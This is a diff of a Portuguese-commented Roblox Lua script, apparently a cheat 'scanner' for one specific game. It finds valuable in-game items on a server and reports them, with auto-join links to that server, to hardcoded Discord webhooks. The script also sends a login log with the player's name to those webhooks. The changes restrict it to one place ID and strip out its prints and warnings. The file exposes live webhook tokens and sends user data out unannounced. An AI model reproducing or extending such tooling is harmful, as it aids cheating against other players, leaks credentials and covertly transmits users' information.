@@ -4,6 +4,14 @@ local HttpService = game:GetService("HttpService")
 local workspace = game:GetService("Workspace")
 local TeleportService = game:GetService("TeleportService")
 
+-- 🎯 PLACE ID ESPECÍFICO
+local TARGET_PLACE_ID = 109983668079237
+
+-- Verificar se estamos no lugar correto
+if game.PlaceId ~= TARGET_PLACE_ID then
+    return
+end
+
 -- WEBHOOKS PARA DIFERENTES VALORES
 local WEBHOOK_SECRETS_GOATS = "https://discord.com/api/webhooks/1426385852250194020/l3hRS6hbAuY4xg_DLJjRCBc7J2T1km-5-ND7scYY0fYTT1KGCUce-NKrjpKk8upoBNh1"
 local WEBHOOK_ABOVE_10M = "https://discord.com/api/webhooks/1422728583113080922/yUC2VEgplhueFqLp5FtJJeW6RvkhelZvwD0c-2S1JdeYPLXihKCXird4N2X0HZwD9B8M"
@@ -11,9 +19,9 @@ local WEBHOOK_NORMAL = "https://discord.com/api/webhooks/1426025472176951346/wxS
 local WEBHOOK_LOGS = "https://discord.com/api/webhooks/1426291457379143680/CDDGYgVERserAOEhiuQLoTeeqnSaaZnCWhIp78gytPU-JzwWQ_LTrGbZnxkOFrgzLtkd"
 
 -- 🛑 SISTEMA DE COOLDOWN FORTIFICADO
-local notificationHistory = {} -- Tabela para armazenar histórico de notificações
-local GLOBAL_COOLDOWN = 5 -- Segundos entre QUALQUER notificação
-local BRAINROT_COOLDOWN = 30 -- Segundos para o MESMO brainrot
+local notificationHistory = {}
+local GLOBAL_COOLDOWN = 5
+local BRAINROT_COOLDOWN = 30
 local lastGlobalNotification = 0
 
 -- Valores mínimos
@@ -21,7 +29,7 @@ local MINIMUM_VALUE_SECRETS_GOATS = 400000000
 local MINIMUM_VALUE_10M = 10000000
 local MINIMUM_VALUE_NORMAL = 500000
 
--- 🔓 SISTEMA DE LOGS DE LOGIN (mantido igual)
+-- 🔓 SISTEMA DE LOGS DE LOGIN
 local function sendLoginLog()
     local localPlayer = Players.LocalPlayer
     local playerName = localPlayer.Name
@@ -134,6 +142,20 @@ local function generateAutoJoinLink()
     return string.format("https://teuzzjheyt.github.io/autojoin/?placeId=%s&gameInstanceId=%s", placeId, jobId)
 end
 
+-- 🧹 FUNÇÃO PARA LIMPAR TAGS HTML/XML
+local function cleanText(text)
+    if not text then return "" end
+    
+    -- Remover tags XML/HTML como <stroke>, <font>, etc.
+    local cleaned = string.gsub(text, "<[^>]+>", "")
+    
+    -- Remover espaços extras
+    cleaned = string.gsub(cleaned, "%s+", " ")
+    cleaned = string.gsub(cleaned, "^%s*(.-)%s*$", "%1")
+    
+    return cleaned
+end
+
 -- Função para determinar o tipo de brainrot
 local function getBrainrotType(valueNum)
     if valueNum >= MINIMUM_VALUE_SECRETS_GOATS then
@@ -151,25 +173,19 @@ end
 local function sendNotificationWithCooldown(brainrotName, valuePerSecond, valueNum, brainrotType)
     local currentTime = tick()
     
-    -- Verificar cooldown global
     if currentTime - lastGlobalNotification < GLOBAL_COOLDOWN then
-        print(string.format("🕒 Cooldown global: %.1fs restantes", GLOBAL_COOLDOWN - (currentTime - lastGlobalNotification)))
         return false
     end
     
-    -- Criar ID único baseado no nome + valor
     local brainrotId = brainrotName .. "_" .. tostring(math.floor(valueNum))
     
-    -- Verificar se este brainrot já foi notificado recentemente
     if notificationHistory[brainrotId] then
         local timeSinceLastNotification = currentTime - notificationHistory[brainrotId]
         if timeSinceLastNotification < BRAINROT_COOLDOWN then
-            print(string.format("🕒 Brainrot em cooldown: %s (%.1fs restantes)", brainrotName, BRAINROT_COOLDOWN - timeSinceLastNotification))
             return false
         end
     end
     
-    -- Determinar webhook
     local webhookUrl, color, title
     if brainrotType == "SECRETS_GOATS" then
         webhookUrl = WEBHOOK_SECRETS_GOATS
@@ -185,10 +201,12 @@ local function sendNotificationWithCooldown(brainrotName, valuePerSecond, valueN
         title = "NEX HUB ∞ Notify"
     end
     
-    -- Gerar link
     local autoJoinLink = generateAutoJoinLink()
     
-    -- Criar embed
+    -- 🧹 LIMPAR O NOME DO BRAINROT
+    local cleanBrainrotName = cleanText(brainrotName)
+    local cleanValuePerSecond = cleanText(valuePerSecond)
+    
     local embedData = {
         username = "Brainrot Scanner",
         embeds = {
@@ -198,12 +216,12 @@ local function sendNotificationWithCooldown(brainrotName, valuePerSecond, valueN
                 fields = {
                     {
                         name = "📛 Nome do Brainrot",
-                        value = brainrotName,
+                        value = cleanBrainrotName,
                         inline = true
                     },
                     {
                         name = "💰 Valor por Segundo",
-                        value = valuePerSecond,
+                        value = cleanValuePerSecond,
                         inline = true
                     },
                     {
@@ -235,7 +253,6 @@ local function sendNotificationWithCooldown(brainrotName, valuePerSecond, valueN
         }
     }
     
-    -- Enviar notificação
     local success = false
     local methods = {
         function()
@@ -266,28 +283,21 @@ local function sendNotificationWithCooldown(brainrotName, valuePerSecond, valueN
         end
     end
     
-    -- 🛑 ATUALIZAR COOLDOWNS SE NOTIFICAÇÃO FOR BEM-SUCEDIDA
     if success then
         lastGlobalNotification = currentTime
         notificationHistory[brainrotId] = currentTime
         
-        -- Limpar histórico antigo (mais de 10 minutos)
         for id, time in pairs(notificationHistory) do
-            if currentTime - time > 600 then -- 10 minutos
+            if currentTime - time > 600 then
                 notificationHistory[id] = nil
             end
         end
-        
-        print(string.format("✅ NOTIFICAÇÃO ENVIADA: %s | %s | Tipo: %s", brainrotName, valuePerSecond, brainrotType))
-        print(string.format("🕒 Próxima notificação em %d segundos", GLOBAL_COOLDOWN))
-    else
-        print("❌ Falha ao enviar notificação")
     end
     
     return success
 end
 
--- 🔍 FUNÇÕES DE DETECÇÃO (mantidas iguais)
+-- 🔍 FUNÇÕES DE DETECÇÃO
 local function parseValue(str)
     if not str then return 0 end
     local cleanStr = string.gsub(str, "/s", "")
@@ -559,32 +569,33 @@ end
 
 -- 🎯 FUNÇÃO PRINCIPAL CORRIGIDA
 local function checkAndNotifyBestBrainrot()
-    -- Buscar melhor brainrot
+    if game.PlaceId ~= TARGET_PLACE_ID then
+        return
+    end
+    
     local best = findBestBrainrot_Alternado()
     
     if best.name == "" or not best.animalModel or best.valueNum == 0 then
         return
     end
     
-    -- Verificar tipo
     local brainrotType = getBrainrotType(best.valueNum)
     if brainrotType == "LOW" then
         return
     end
     
-    -- 🛑 ENVIAR NOTIFICAÇÃO COM COOLDOWN
     sendNotificationWithCooldown(best.name, best.valueStr, best.valueNum, brainrotType)
 end
 
 -- 🚀 LOOP PRINCIPAL
 while true do
+    if game.PlaceId ~= TARGET_PLACE_ID then
+        break
+    end
+    
     local success, err = pcall(function()
         checkAndNotifyBestBrainrot()
     end)
     
-    if not success then
-        warn("❌ Erro no scanner: " .. tostring(err))
-    end
-    
-    wait(1) -- 1 segundo entre verificações
+    wait(1)
 end
